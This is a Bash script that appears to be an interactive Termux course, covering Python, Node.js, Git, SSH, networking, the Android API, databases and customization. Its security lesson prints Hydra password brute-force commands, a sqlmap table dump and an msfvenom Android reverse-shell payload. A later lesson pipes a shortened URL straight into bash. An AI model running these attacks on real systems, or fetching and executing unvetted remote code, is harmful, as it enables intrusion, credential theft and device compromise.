    echo -e "  ${CYAN}Interactive Mode:${NC}"
    show_cmd "python"
    echo -e "  >>> print('Hello from Termux!')"
    echo -e "  >>> exit()"
    echo ""

    echo -e "  ${CYAN}Run a Script:${NC}"
    show_cmd "nano hello.py"
    echo -e "  ${WHITE}  # Write this content:${NC}"
    echo -e "  ${GREEN}  #!/usr/bin/env python3${NC}"
    echo -e "  ${GREEN}  import os, platform${NC}"
    echo -e "  ${GREEN}  print(f'Hello from {platform.system()}!')${NC}"
    echo -e "  ${GREEN}  print(f'Home: {os.environ[\"HOME\"]}')${NC}"
    echo ""
    show_cmd "python hello.py"
    echo ""

    echo -e "  ${WHITE}━━━ POPULAR PIP PACKAGES ━━━${NC}"
    show_cmd "pip install requests        # HTTP library"
    show_cmd "pip install flask           # Web framework"
    show_cmd "pip install beautifulsoup4  # Web scraping"
    show_cmd "pip install rich            # Beautiful terminal output"
    show_cmd "pip install youtube-dl      # Download videos"
    show_cmd "pip install pandas          # Data analysis"
    echo ""

    echo -e "  ${WHITE}━━━ EXAMPLE: Simple Web Scraper ━━━${NC}"
    echo -e "  ${GREEN}  import requests${NC}"
    echo -e "  ${GREEN}  from bs4 import BeautifulSoup${NC}"
    echo -e "  ${GREEN}  ${NC}"
    echo -e "  ${GREEN}  url = 'https://example.com'${NC}"
    echo -e "  ${GREEN}  response = requests.get(url)${NC}"
    echo -e "  ${GREEN}  soup = BeautifulSoup(response.text, 'html.parser')${NC}"
    echo -e "  ${GREEN}  print(soup.title.string)${NC}"
    echo ""

    echo -e "  ${WHITE}━━━ VIRTUAL ENVIRONMENTS ━━━${NC}"
    show_cmd "python -m venv myenv"
    show_cmd "source myenv/bin/activate"
    show_cmd "deactivate"
    echo ""

    tip "If pip install fails, try: pip install --break-system-packages <pkg>"
    tip "Some packages need build tools: pkg install build-essential"

    pause 4
}

#=============================================================================
# LESSON 5: NODE.JS
#=============================================================================
lesson_5() {
    header "LESSON 5: Node.js in Termux"

    termux-tts-speak "Lesson 5 introduces Node.js. We will cover installation, running JavaScript servers, and using the NPM package manager." 2>/dev/null &

    echo -e "  ${WHITE}━━━ INSTALLATION ━━━${NC}"
    show_cmd "pkg install nodejs"
    show_cmd "node --version"
    show_cmd "npm --version"
    echo ""

    echo -e "  ${WHITE}━━━ RUNNING NODE.JS ━━━${NC}"
    echo ""
    echo -e "  ${CYAN}Interactive REPL:${NC}"
    show_cmd "node"
    echo -e "  > console.log('Hello Termux!')"
    echo -e "  > .exit"
    echo ""

    echo -e "  ${CYAN}Run a Script:${NC}"
    show_cmd "nano server.js"
    echo -e "  ${GREEN}  const http = require('http');${NC}"
    echo -e "  ${GREEN}  const server = http.createServer((req, res) => {${NC}"
    echo -e "  ${GREEN}    res.writeHead(200, {'Content-Type': 'text/html'});${NC}"
    echo -e "  ${GREEN}    res.end('<h1>Hello from Termux!</h1>');${NC}"
    echo -e "  ${GREEN}  });${NC}"
    echo -e "  ${GREEN}  server.listen(8080, () => {${NC}"
    echo -e "  ${GREEN}    console.log('Server: http://localhost:8080');${NC}"
    echo -e "  ${GREEN}  });${NC}"
    echo ""
    show_cmd "node server.js"
    explain "Open browser → http://localhost:8080"
    echo ""

    echo -e "  ${WHITE}━━━ POPULAR NPM PACKAGES ━━━${NC}"
    show_cmd "npm install -g nodemon      # Auto-restart on changes"
    show_cmd "npm install -g http-server   # Quick static file server"
    show_cmd "npm install -g live-server   # Dev server with live reload"
    show_cmd "npm install -g typescript    # TypeScript compiler"
    show_cmd "npm install -g pm2           # Process manager"
    echo ""

    echo -e "  ${WHITE}━━━ QUICK STATIC SERVER ━━━${NC}"
    show_cmd "http-server ~/storage/downloads -p 3000"
    explain "Serves files from your Downloads folder on port 3000"

    pause 5
}

#=============================================================================
# LESSON 6: GIT & GITHUB
#=============================================================================
lesson_6() {
    header "LESSON 6: Git & GitHub"

    termux-tts-speak "In Lesson 6, we dive into version control with Git and GitHub. You will learn to clone, commit, push, and manage SSH keys." 2>/dev/null &

    echo -e "  ${WHITE}━━━ INSTALLATION & CONFIG ━━━${NC}"
    show_cmd "pkg install git"
    show_cmd "git config --global user.name 'Your Name'"
    show_cmd "git config --global user.email 'you@email.com'"
    show_cmd "git config --global init.defaultBranch main"
    echo ""

    echo -e "  ${WHITE}━━━ ESSENTIAL GIT COMMANDS ━━━${NC}"
    echo ""
    echo -e "  ${CYAN}Creating & Cloning:${NC}"
    show_cmd "git init                          # Initialize new repo"
    show_cmd "git clone https://github.com/user/repo.git  # Clone"
    echo ""

    echo -e "  ${CYAN}Daily Workflow:${NC}"
    show_cmd "git status                        # Check status"
    show_cmd "git add .                         # Stage all changes"
    show_cmd "git add file.txt                  # Stage specific file"
    show_cmd "git commit -m 'Your message'      # Commit"
    show_cmd "git push origin main              # Push to remote"
    show_cmd "git pull origin main              # Pull from remote"
    echo ""

    echo -e "  ${CYAN}Branching:${NC}"
    show_cmd "git branch                        # List branches"
    show_cmd "git branch feature-x              # Create branch"
    show_cmd "git checkout feature-x            # Switch branch"
    show_cmd "git checkout -b feature-x         # Create & switch"
    show_cmd "git merge feature-x               # Merge branch"
    echo ""

    echo -e "  ${CYAN}History & Info:${NC}"
    show_cmd "git log --oneline --graph         # Pretty log"
    show_cmd "git diff                          # Show changes"
    show_cmd "git stash                         # Stash changes"
    show_cmd "git stash pop                     # Restore stash"
    echo ""

    echo -e "  ${WHITE}━━━ SSH KEYS FOR GITHUB ━━━${NC}"
    show_cmd "ssh-keygen -t ed25519 -C 'you@email.com'"
    show_cmd "cat ~/.ssh/id_ed25519.pub"
    explain "Copy the output → GitHub → Settings → SSH Keys → Add"
    echo ""
    show_cmd "ssh -T git@github.com             # Test connection"

    pause 6
}

#=============================================================================
# LESSON 7: SSH & REMOTE CONNECTIONS
#=============================================================================
lesson_7() {
    header "LESSON 7: SSH & Remote Connections"

    termux-tts-speak "Lesson 7 focuses on remote access. We will explore SSH clients and servers, file transfers with SCP and rsync, and terminal multiplexing with tmux." 2>/dev/null &

    echo -e "  ${WHITE}━━━ OPENSSH (SSH Client & Server) ━━━${NC}"
    show_cmd "pkg install openssh"
    echo ""

    echo -e "  ${CYAN}Connect to Remote Server:${NC}"
    show_cmd "ssh user@192.168.1.100"
    show_cmd "ssh user@server.com -p 2222       # Custom port"
    show_cmd "ssh -i ~/.ssh/mykey user@server    # Using key file"
    echo ""

    echo -e "  ${CYAN}Run Termux as SSH Server:${NC}"
    show_cmd "sshd                               # Start SSH server"
    explain "Default port: 8022 (not 22, since Termux is non-root)"
    show_cmd "whoami                             # Get your username"
    show_cmd "passwd                             # Set a password"
    echo ""
    explain "From another device, connect with:"
    show_cmd "ssh <username>@<phone-ip> -p 8022"
    echo ""

    echo -e "  ${CYAN}Useful SSH Key Commands:${NC}"
    show_cmd "ssh-keygen -t ed25519              # Generate key pair"
    show_cmd "ssh-copy-id user@server            # Copy key to server"
    echo ""

    echo -e "  ${WHITE}━━━ SCP & RSYNC (File Transfer) ━━━${NC}"
    show_cmd "scp file.txt user@server:/path/    # Upload file"
    show_cmd "scp user@server:/path/file.txt .   # Download file"
    show_cmd "scp -r folder/ user@server:/path/  # Upload folder"
    echo ""
    show_cmd "pkg install rsync"
    show_cmd "rsync -avz folder/ user@server:/backup/"
    explain "rsync only transfers changed files — faster for syncing."
    echo ""

    echo -e "  ${WHITE}━━━ TMUX (Terminal Multiplexer) ━━━${NC}"
    show_cmd "pkg install tmux"
    show_cmd "tmux                               # Start new session"
    show_cmd "tmux new -s mysession              # Named session"
    echo ""
    echo -e "  ${WHITE}Tmux Key Bindings (prefix: Ctrl+B):${NC}"
    echo -e "  ${CYAN}Ctrl+B, c${NC}     → New window"
    echo -e "  ${CYAN}Ctrl+B, n${NC}     → Next window"
    echo -e "  ${CYAN}Ctrl+B, p${NC}     → Previous window"
    echo -e "  ${CYAN}Ctrl+B, %${NC}     → Split vertically"
    echo -e "  ${CYAN}Ctrl+B, \"${NC}     → Split horizontally"
    echo -e "  ${CYAN}Ctrl+B, d${NC}     → Detach session"
    echo -e "  ${CYAN}Ctrl+B, [${NC}     → Scroll mode (q to exit)"
    echo ""
    show_cmd "tmux ls                            # List sessions"
    show_cmd "tmux attach -t mysession           # Re-attach"
    show_cmd "tmux kill-session -t mysession     # Kill session"

    pause 7
}

#=============================================================================
# LESSON 8: NETWORKING TOOLS
#=============================================================================
lesson_8() {
    header "LESSON 8: Networking Tools"

    termux-tts-speak "Lesson 8 covers essential networking tools. We will use curl, wget, nmap, and netcat for scanning and data transfer." 2>/dev/null &

    echo -e "  ${WHITE}━━━ CURL & WGET (Download/API) ━━━${NC}"
    show_cmd "pkg install curl wget"
    echo ""
    show_cmd "curl https://api.github.com            # GET request"
    show_cmd "curl -o file.zip https://example.com/f  # Download"
    show_cmd "curl -X POST -d 'key=val' https://...   # POST"
    show_cmd "curl -s https://wttr.in/London          # Weather!"
    echo ""
    show_cmd "wget https://example.com/file.tar.gz    # Download file"
    show_cmd "wget -r -np https://site.com/dir/       # Mirror dir"
    echo ""

    echo -e "  ${WHITE}━━━ NMAP (Network Scanner) ━━━${NC}"
    tool_name "nmap"
    show_cmd "pkg install nmap"
    show_cmd "nmap -sS -Pn target.com                 # Stealth Scan (no ping)"
    show_cmd "nmap -sV --version-intensity 5 target   # Deep Version Detection"
    show_cmd "nmap -A -T4 target.com                  # Aggressive + Faster Timing"
    show_cmd "nmap -p- target.com                     # Scan ALL 65,535 ports"
    show_cmd "nmap --script vuln target.com           # Run vulnerability scripts"
    echo ""
    explain "Practice: Always log nmap output to a file using '-oN scan_results.txt'."
    warn "Unauthorized scanning can be detected by IDPS systems."
    echo ""

    echo -e "  ${WHITE}━━━ NETCAT (nc) ━━━${NC}"
    tool_name "netcat-openbsd"
    explain "The 'Swiss Army Knife' of networking. Used for port checking and data transfer."
    show_cmd "pkg install netcat-openbsd"
    show_cmd "nc -zv google.com 80                    # Port check"
    show_cmd "nc -l -p 4444                           # Listen on port"
    show_cmd "echo 'Hello' | nc server.com 4444       # Send data"
    echo ""

    echo -e "  ${WHITE}━━━ OTHER NETWORKING TOOLS ━━━${NC}"
    show_cmd "pkg install iproute2"
    show_cmd "ip addr                                 # Show IP addresses"
    show_cmd "ip route                                # Show routes"
    echo ""
    show_cmd "pkg install dnsutils"
    show_cmd "dig google.com                          # DNS lookup"
    show_cmd "nslookup google.com                     # DNS lookup"
    echo ""
    show_cmd "ping -c 5 google.com                    # Ping test"
    show_cmd "traceroute google.com                   # Trace route"
    echo ""
    show_cmd "pkg install whois"
    show_cmd "whois google.com                        # WHOIS lookup"

    echo ""
    quiz "Which Nmap flag is used for service version detection?" "-sV" "-O" "-v" "A"

    live_lab "Check if Google's port 443 is open using 'nc -zv google.com 443'."
    pause 8
}

#=============================================================================
# LESSON 9: TERMUX:API
#=============================================================================
lesson_9() {
    header "LESSON 9: Termux:API (Control Your Phone)"

    termux-tts-speak "In Lesson 9, we use the Termux API to interact with Android hardware. You will learn to control battery, sensors, camera, and notifications." 2>/dev/null &

    echo -e "  ${WHITE}Termux:API lets you access Android hardware & features!${NC}"
    echo ""
    warn "Install the 'Termux:API' app from F-Droid first."
    echo ""
    show_cmd "pkg install termux-api"
    echo ""

    echo -e "  ${WHITE}━━━ DEVICE INFO ━━━${NC}"
    show_cmd "termux-battery-status               # Battery info (JSON)"
    show_cmd "termux-wifi-connectioninfo           # WiFi details"
    show_cmd "termux-telephony-deviceinfo          # Phone/SIM info"
    show_cmd "termux-location                      # GPS location"
    echo ""

    echo -e "  ${WHITE}━━━ NOTIFICATIONS & ALERTS ━━━${NC}"
    show_cmd "termux-notification --title 'Hello' --content 'From Termux'"
    show_cmd "termux-toast 'Quick message!'        # Toast notification"
    show_cmd "termux-vibrate -d 500                # Vibrate 500ms"
    show_cmd "termux-tts-speak 'Hello World'       # Text to speech"
    echo ""

    echo -e "  ${WHITE}━━━ CLIPBOARD ━━━${NC}"
    show_cmd "termux-clipboard-set 'copied text'   # Set clipboard"
    show_cmd "termux-clipboard-get                  # Get clipboard"
    echo ""

    echo -e "  ${WHITE}━━━ CAMERA & MEDIA ━━━${NC}"
    show_cmd "termux-camera-photo -c 0 photo.jpg   # Take photo"
    show_cmd "termux-media-player play song.mp3    # Play audio"
    show_cmd "termux-microphone-record -f rec.m4a  # Record audio"
    show_cmd "termux-microphone-record -q          # Stop recording"
    echo ""

    echo -e "  ${WHITE}━━━ INTERACTION ━━━${NC}"
    show_cmd "termux-dialog confirm -t 'Sure?'     # Confirmation dialog"
    show_cmd "termux-dialog text -t 'Enter name'   # Text input"
    show_cmd "termux-dialog sheet -v 'a,b,c'       # Selection sheet"
    show_cmd "termux-share -a send file.txt        # Share a file"
    show_cmd "termux-open https://google.com       # Open URL"
    show_cmd "termux-open file.pdf                 # Open file"
    echo ""

    echo -e "  ${WHITE}━━━ SENSORS & CONTACTS ━━━${NC}"
    show_cmd "termux-sensor -l                     # List sensors"
    show_cmd "termux-sensor -s 'accelerometer' -n 5  # Read sensor"
    show_cmd "termux-contact-list                  # List contacts"
    show_cmd "termux-sms-list -l 5                 # Last 5 SMS"
    show_cmd "termux-sms-send -n '+1234567890' 'Hi'  # Send SMS"
    echo ""

    echo -e "  ${WHITE}━━━ EXAMPLE: Battery Alert Script ━━━${NC}"
    echo -e "  ${GREEN}  #!/bin/bash${NC}"
    echo -e "  ${GREEN}  level=\$(termux-battery-status | grep percentage | grep -o '[0-9]*')${NC}"
    echo -e "  ${GREEN}  if [ \"\$level\" -lt 20 ]; then${NC}"
    echo -e "  ${GREEN}    termux-notification --title 'Low Battery' \\${NC}"
    echo -e "  ${GREEN}      --content \"Battery at \${level}%!\"${NC}"
    echo -e "  ${GREEN}    termux-vibrate -d 1000${NC}"
    echo -e "  ${GREEN}  fi${NC}"

    echo ""
    quiz "Which command is used to show a popup message on Android?" "termux-toast" "termux-notification" "termux-dialog" "A"

    live_lab "Try to make your phone vibrate for 1 second using 'termux-vibrate -d 1000'."
    pause 9
}

#=============================================================================
# LESSON 10: HACKING & SECURITY TOOLS
#=============================================================================
lesson_10() {
    header "LESSON 10: Security & Penetration Testing Tools"

    termux-tts-speak "Lesson 10 introduces security and penetration testing. We will cover tools like Hydra, Sqlmap, John the Ripper, and Metasploit." 2>/dev/null &

    warn "LEGAL DISCLAIMER: Only use these tools on systems you OWN"
    warn "or have EXPLICIT WRITTEN PERMISSION to test."
    warn "Unauthorized access is ILLEGAL."
    echo ""

    echo -e "  ${WHITE}━━━ HYDRA (Password Cracker) ━━━${NC}"
    tool_name "hydra"
    show_cmd "pkg install hydra"
    show_cmd "hydra -l admin -P wordlist.txt 192.168.1.1 ssh"
    show_cmd "hydra -L users.txt -P pass.txt ftp://192.168.1.1"
    show_cmd "hydra -l admin -P wordlist.txt 192.168.1.1 http-post-form \\
      '/login:user=^USER^&pass=^PASS^:F=incorrect'"
    explain "Detail: Hydra supports over 50 protocols including SSH, SMB, and MySQL."
    echo ""

    echo -e "  ${WHITE}━━━ SQLMAP (SQL Injection) ━━━${NC}"
    tool_name "sqlmap (via Python)"
    show_cmd "pip install sqlmap"
    show_cmd "sqlmap -u 'http://target.com/page?id=1' --dbs"
    show_cmd "sqlmap -u 'http://target.com/page?id=1' --tables -D dbname"
    show_cmd "sqlmap -u 'http://target.com/page?id=1' --dump -D db -T users"
    explain "Detail: '--batch' automates choices, '--random-agent' bypasses simple WAFs."
    echo ""

    echo -e "  ${WHITE}━━━ JOHN THE RIPPER (Hash Cracker) ━━━${NC}"
    tool_name "john"
    show_cmd "pkg install john"
    show_cmd "john --wordlist=wordlist.txt hashes.txt"
    show_cmd "john --show hashes.txt"
    echo ""

    echo -e "  ${WHITE}━━━ HASHCAT (GPU Hash Cracker) ━━━${NC}"
    tool_name "hashcat"
    show_cmd "pkg install hashcat"
    show_cmd "hashcat -m 0 hash.txt wordlist.txt      # MD5"
    show_cmd "hashcat -m 1000 hash.txt wordlist.txt    # NTLM"
    echo ""

    echo -e "  ${WHITE}━━━ METASPLOIT & MSFVENOM ━━━${NC}"
    tool_name "metasploit"
    explain "Practice: Use msfvenom to generate payloads for testing."
    show_cmd "msfvenom -p android/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -o lab.apk"
    show_cmd "msfconsole -q                          # Start in quiet mode"
    show_cmd "msf> search eternalblue                # Search for specific exploits"
    show_cmd "msfconsole"
    echo ""

    echo -e "  ${WHITE}━━━ OTHER SECURITY TOOLS ━━━${NC}"
    show_cmd "pkg install tcpdump              # Packet sniffer"
    show_cmd "pkg install aircrack-ng          # WiFi security testing"
    show_cmd "pkg install wireshark-cli        # (tshark) Packet analyzer"
    show_cmd "pip install scapy                # Packet crafting (Python)"
    echo ""

    echo -e "  ${WHITE}━━━ CREATING WORDLISTS ━━━${NC}"
    show_cmd "pkg install crunch"
    show_cmd "crunch 6 8 abcdef123 -o wordlist.txt"
    explain "Generates passwords 6-8 chars using given characters"
    echo ""

    echo -e "  ${WHITE}━━━ NIKTO (Web Scanner) ━━━${NC}"
    tool_name "nikto"
    show_cmd "pkg install nikto"
    show_cmd "nikto -h http://example.com"
    echo ""

    echo -e "  ${WHITE}━━━ WIFITE (Wireless Attack) ━━━${NC}"
    tool_name "wifite"
    show_cmd "pkg install wifite"
    explain "Automated tool for Wi-Fi penetration testing."
    echo ""

    quiz "Which tool is best for automated SQL injection testing?" "Hydra" "Sqlmap" "John" "B"

    live_lab "Run 'nmap --version' and 'hydra -h' to ensure tools are ready for use."
    pause 10
}

#=============================================================================
# LESSON 11: AUTOMATION & SCRIPTING
#=============================================================================
lesson_11() {
    header "LESSON 11: Automation & Bash Scripting"

    termux-tts-speak "Lesson 11 is about automation. You will learn Bash scripting basics, scheduling tasks with cron, and running scripts on boot." 2>/dev/null &

    echo -e "  ${WHITE}━━━ BASH SCRIPTING BASICS ━━━${NC}"
    echo ""
    echo -e "  ${GREEN}  #!/data/data/com.termux/files/usr/bin/bash${NC}"
    echo -e "  ${GREEN}  # Or simply: #!/bin/bash${NC}"
    echo -e "  ${GREEN}  ${NC}"
    echo -e "  ${GREEN}  # Variables${NC}"
    echo -e "  ${GREEN}  NAME=\"Termux\"${NC}"
    echo -e "  ${GREEN}  echo \"Hello, \$NAME!\"${NC}"
    echo -e "  ${GREEN}  ${NC}"
    echo -e "  ${GREEN}  # User input${NC}"
    echo -e "  ${GREEN}  read -p \"Enter your name: \" USER${NC}"
    echo -e "  ${GREEN}  echo \"Welcome, \$USER!\"${NC}"
    echo -e "  ${GREEN}  ${NC}"
    echo -e "  ${GREEN}  # Conditionals${NC}"
    echo -e "  ${GREEN}  if [ -f \"file.txt\" ]; then${NC}"
    echo -e "  ${GREEN}      echo \"File exists\"${NC}"
    echo -e "  ${GREEN}  else${NC}"
    echo -e "  ${GREEN}      echo \"File not found\"${NC}"
    echo -e "  ${GREEN}  fi${NC}"
    echo -e "  ${GREEN}  ${NC}"
    echo -e "  ${GREEN}  # Loops${NC}"
    echo -e "  ${GREEN}  for i in 1 2 3 4 5; do${NC}"
    echo -e "  ${GREEN}      echo \"Number: \$i\"${NC}"
    echo -e "  ${GREEN}  done${NC}"
    echo -e "  ${GREEN}  ${NC}"
    echo -e "  ${GREEN}  # Functions${NC}"
    echo -e "  ${GREEN}  greet() {${NC}"
    echo -e "  ${GREEN}      echo \"Hello, \$1!\"${NC}"
    echo -e "  ${GREEN}  }${NC}"
    echo -e "  ${GREEN}  greet \"World\"${NC}"
    echo ""

    show_cmd "chmod +x script.sh    # Make executable"
    show_cmd "./script.sh            # Run it"
    echo ""

    echo -e "  ${WHITE}━━━ CRON JOBS (Scheduling) ━━━${NC}"
    show_cmd "pkg install cronie termux-services"
    show_cmd "sv-enable crond"
    show_cmd "sv up crond"
    show_cmd "crontab -e"
    echo ""
    echo -e "  ${WHITE}Cron Format: MIN HOUR DOM MON DOW command${NC}"
    echo -e "  ${GREEN}  # Run every hour${NC}"
    echo -e "  ${GREEN}  0 * * * * ~/scripts/check.sh${NC}"
    echo -e "  ${GREEN}  # Run daily at 8 AM${NC}"
    echo -e "  ${GREEN}  0 8 * * * ~/scripts/backup.sh${NC}"
    echo -e "  ${GREEN}  # Run every 5 minutes${NC}"
    echo -e "  ${GREEN}  */5 * * * * ~/scripts/monitor.sh${NC}"
    echo ""

    echo -e "  ${WHITE}━━━ TERMUX:BOOT (Run on Device Boot) ━━━${NC}"
    warn "Install 'Termux:Boot' app from F-Droid."
    show_cmd "mkdir -p ~/.termux/boot"
    show_cmd "nano ~/.termux/boot/start-sshd.sh"
    echo -e "  ${GREEN}  #!/data/data/com.termux/files/usr/bin/bash${NC}"
    echo -e "  ${GREEN}  termux-wake-lock${NC}"
    echo -e "  ${GREEN}  sshd${NC}"
    show_cmd "chmod +x ~/.termux/boot/start-sshd.sh"
    explain "This starts SSH server automatically when phone boots."

    pause 11
}

#=============================================================================
# LESSON 12: DATABASE TOOLS
#=============================================================================
lesson_12() {
    header "LESSON 12: Databases"

    termux-tts-speak "In Lesson 12, we explore databases. You will learn to work with SQLite, MariaDB, PostgreSQL, and Redis within Termux." 2>/dev/null &

    echo -e "  ${WHITE}━━━ SQLITE3 ━━━${NC}"
    tool_name "sqlite3 (Lightweight, file-based)"
    show_cmd "pkg install sqlite"
    show_cmd "sqlite3 mydb.db"
    echo ""
    echo -e "  ${GREEN}  CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, age INT);${NC}"
    echo -e "  ${GREEN}  INSERT INTO users (name, age) VALUES ('Alice', 30);${NC}"
    echo -e "  ${GREEN}  INSERT INTO users (name, age) VALUES ('Bob', 25);${NC}"
    echo -e "  ${GREEN}  SELECT * FROM users;${NC}"
    echo -e "  ${GREEN}  .tables${NC}"
    echo -e "  ${GREEN}  .schema users${NC}"
    echo -e "  ${GREEN}  .quit${NC}"
    echo ""

    echo -e "  ${WHITE}━━━ MARIADB (MySQL Compatible) ━━━${NC}"
    tool_name "mariadb"
    show_cmd "pkg install mariadb"
    show_cmd "mysqld_safe &                       # Start server"
    show_cmd "mysql -u root"
    echo ""
    echo -e "  ${GREEN}  CREATE DATABASE testdb;${NC}"
    echo -e "  ${GREEN}  USE testdb;${NC}"
    echo -e "  ${GREEN}  CREATE TABLE items (id INT AUTO_INCREMENT PRIMARY KEY, name VARCHAR(50));${NC}"
    echo -e "  ${GREEN}  INSERT INTO items (name) VALUES ('Widget');${NC}"
    echo -e "  ${GREEN}  SELECT * FROM items;${NC}"
    echo ""

    echo -e "  ${WHITE}━━━ POSTGRESQL ━━━${NC}"
    tool_name "postgresql"
    show_cmd "pkg install postgresql"
    show_cmd "initdb \$PREFIX/var/lib/postgresql"
    show_cmd "pg_ctl -D \$PREFIX/var/lib/postgresql start"
    show_cmd "createdb testdb"
    show_cmd "psql testdb"
    echo ""

    echo -e "  ${WHITE}━━━ REDIS ━━━${NC}"
    tool_name "redis"
    show_cmd "pkg install redis"
    show_cmd "redis-server &                      # Start server"
    show_cmd "redis-cli"
    echo -e "  ${GREEN}  SET greeting 'Hello Termux'${NC}"
    echo -e "  ${GREEN}  GET greeting${NC}"
    echo -e "  ${GREEN}  KEYS *${NC}"

    pause 12
}

#=============================================================================
# LESSON 13: ADVANCED TOOLS & PROOT
#=============================================================================
lesson_13() {
    header "LESSON 13: Advanced - proot-distro & Full Linux"

    termux-tts-speak "Lesson 13 covers proot-distro. You will learn how to install and run full Linux distributions like Ubuntu and Kali Linux inside Termux." 2>/dev/null &

    echo -e "  ${WHITE}━━━ PROOT-DISTRO (Run Full Linux Distros!) ━━━${NC}"
    tool_name "proot-distro"
    show_cmd "pkg install proot-distro"
    echo ""

    echo -e "  ${CYAN}List Available Distros:${NC}"
    show_cmd "proot-distro list"
    echo ""
    echo -e "  ${WHITE}Available distros include:${NC}"
    echo -e "  • Ubuntu       • Debian      • Fedora"
    echo -e "  • Arch Linux   • Alpine      • openSUSE"
    echo -e "  • Kali Linux   • Void Linux  • Pardus"
    echo ""

    echo -e "  ${CYAN}Install & Run Ubuntu:${NC}"
    show_cmd "proot-distro install ubuntu"
    show_cmd "proot-distro login ubuntu"
    explain "You're now inside a full Ubuntu environment!"
    echo ""

    echo -e "  ${CYAN}Install & Run Kali Linux:${NC}"
    show_cmd "proot-distro install nethunter"
    show_cmd "proot-distro login nethunter"
    explain "Access Kali's full tool suite!"
    echo ""

    echo -e "  ${CYAN}Management:${NC}"
    show_cmd "proot-distro list                   # List installed"
    show_cmd "proot-distro remove ubuntu          # Remove distro"
    show_cmd "proot-distro reset ubuntu           # Reset distro"
    show_cmd "proot-distro backup ubuntu          # Backup"
    show_cmd "proot-distro restore ubuntu         # Restore"
    echo ""

    echo -e "  ${CYAN}Run Commands Without Logging In:${NC}"
    show_cmd "proot-distro login ubuntu -- apt update"
    show_cmd "proot-distro login ubuntu -- cat /etc/os-release"
    echo ""

    echo -e "  ${WHITE}━━━ RUNNING A GUI (DESKTOP) ━━━${NC}"
    show_cmd "pkg install x11-repo"
    show_cmd "pkg install tigervnc xfce4"
    echo ""
    explain "Inside proot Ubuntu:"
    echo -e "  ${GREEN}  apt install xfce4 xfce4-goodies tigervnc-standalone-server${NC}"
    echo -e "  ${GREEN}  vncserver :1${NC}"
    explain "Then use a VNC viewer app to connect to localhost:5901"
    echo ""

    tip "Install 'AVNC' from F-Droid for VNC viewing."
    tip "proot has no root access — it fakes it. Some tools won't work."

    pause 13
}

#=============================================================================
# LESSON 14: FILE PROCESSING & SYSTEM TOOLS
#=============================================================================
lesson_14() {
    header "LESSON 14: File Processing & Power Tools"

    termux-tts-speak "Lesson 14 focuses on text and file processing tools like grep, sed, awk, and modern utilities like fzf and jq." 2>/dev/null &

    echo -e "  ${WHITE}━━━ TEXT PROCESSING ━━━${NC}"
    show_cmd "grep 'pattern' file.txt              # Search in file"
    show_cmd "grep -r 'TODO' ~/projects/           # Recursive search"
    show_cmd "grep -i 'hello' file.txt             # Case insensitive"
    show_cmd "grep -n 'error' logfile.log          # Show line numbers"
    echo ""
    show_cmd "sed 's/old/new/g' file.txt           # Replace text"
    show_cmd "sed -i 's/old/new/g' file.txt        # Replace in-place"
    echo ""
    show_cmd "awk '{print \$1, \$3}' data.txt       # Print columns 1,3"
    show_cmd "awk -F',' '{print \$2}' data.csv      # CSV column 2"
    echo ""
    show_cmd "sort file.txt                        # Sort lines"
    show_cmd "uniq file.txt                        # Remove duplicates"
    show_cmd "wc -l file.txt                       # Count lines"
    show_cmd "head -20 file.txt                    # First 20 lines"
    show_cmd "tail -f logfile.log                  # Follow log file"
    echo ""

    echo -e "  ${WHITE}━━━ COMPRESSION ━━━${NC}"
    show_cmd "tar -czf archive.tar.gz folder/      # Compress"
    show_cmd "tar -xzf archive.tar.gz              # Extract"
    show_cmd "zip -r archive.zip folder/            # Create zip"
    show_cmd "unzip archive.zip                     # Extract zip"
    show_cmd "pkg install p7zip"
    show_cmd "7z x archive.7z                       # Extract 7z"
    echo ""

    echo -e "  ${WHITE}━━━ FIND & LOCATE ━━━${NC}"
    show_cmd "find ~ -name '*.py'                  # Find Python files"
    show_cmd "find ~ -name '*.log' -mtime -7       # Modified in 7 days"
    show_cmd "find ~ -size +100M                   # Files > 100MB"
    show_cmd "find ~ -type f -name '*.tmp' -delete # Delete temp files"
    echo ""

    echo -e "  ${WHITE}━━━ DISK & FILE INFO ━━━${NC}"
    show_cmd "df -h                                # Disk usage"
    show_cmd "du -sh ~/projects/*                  # Folder sizes"
    show_cmd "file unknown_file                    # Detect file type"
    show_cmd "stat file.txt                        # Detailed file info"
    echo ""

    echo -e "  ${WHITE}━━━ FZF (Fuzzy Finder) ━━━${NC}"
    tool_name "fzf"
    show_cmd "pkg install fzf"
    show_cmd "find ~ | fzf                         # Fuzzy search files"
    show_cmd "history | fzf                        # Search history"
    show_cmd "cat file.txt | fzf                   # Search in content"
    echo ""

    echo -e "  ${WHITE}━━━ JQ (JSON Processor) ━━━${NC}"
    tool_name "jq"
    show_cmd "pkg install jq"
    show_cmd "curl -s https://api.github.com | jq '.'"
    show_cmd "echo '{\"name\":\"John\",\"age\":30}' | jq '.name'"
    show_cmd "cat data.json | jq '.users[].email'"

    pause 14
}

#=============================================================================
# LESSON 15: CUSTOMIZATION
#=============================================================================
lesson_15() {
    header "LESSON 15: Customizing Termux"

    termux-tts-speak "In Lesson 15, we customize your environment. You will learn to change themes, fonts, and set up advanced shells like Zsh and Fish." 2>/dev/null &

    echo -e "  ${WHITE}━━━ APPEARANCE ━━━${NC}"
    echo ""
    echo -e "  ${CYAN}Change Color Scheme & Font:${NC}"
    show_cmd "mkdir -p ~/.termux"
    show_cmd "nano ~/.termux/termux.properties"
    echo ""
    echo -e "  ${GREEN}  # termux.properties content:${NC}"
    echo -e "  ${GREEN}  extra-keys = [['ESC','/','-','HOME','UP','END','PGUP'], \\${NC}"
    echo -e "  ${GREEN}               ['TAB','CTRL','ALT','LEFT','DOWN','RIGHT','PGDN']]${NC}"
    echo -e "  ${GREEN}  ${NC}"
    echo -e "  ${GREEN}  # Use two-row extra keys${NC}"
    echo -e "  ${GREEN}  # Bell character vibration (true/false)${NC}"
    echo -e "  ${GREEN}  bell-character = vibrate${NC}"
    echo -e "  ${GREEN}  # Use black keyboard${NC}"
    echo -e "  ${GREEN}  use-black-ui = true${NC}"
    echo ""
    show_cmd "termux-reload-settings               # Apply changes"
    echo ""

    echo -e "  ${CYAN}Install Color Schemes & Fonts:${NC}"
    show_cmd "# Using the popular styling script:"
    show_cmd "bash -c \"\$(curl -fsSL https://git.io/Jd7GA)\""
    explain "This provides an interactive menu for themes and fonts."
    echo ""

    echo -e "  ${WHITE}━━━ ZSH & OH-MY-ZSH ━━━${NC}"
    show_cmd "pkg install zsh"
    show_cmd "chsh -s zsh                          # Set as default shell"
